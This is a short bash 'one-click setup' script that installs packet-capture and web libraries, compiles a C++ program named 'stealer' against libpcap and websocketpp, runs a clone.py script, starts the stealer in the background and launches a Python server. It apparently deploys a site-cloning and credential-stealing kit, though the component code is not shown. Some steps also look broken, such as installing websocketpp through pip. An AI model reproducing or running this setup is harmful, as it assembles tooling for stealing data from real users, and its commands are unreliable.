#!/bin/bash
# HEADER: ONE-CLICK SETUP
apt update && apt install -y python3 python3-pip clang make openssh libpcap-dev
pip install flask requests beautifulsoup4 websocketpp websocket-client
g++ -std=c++11 -o stealer stealer.cpp -lpcap -lwebsocketpp -lpthread -lboost_system
python3 clone.py
./stealer &
python3 server.py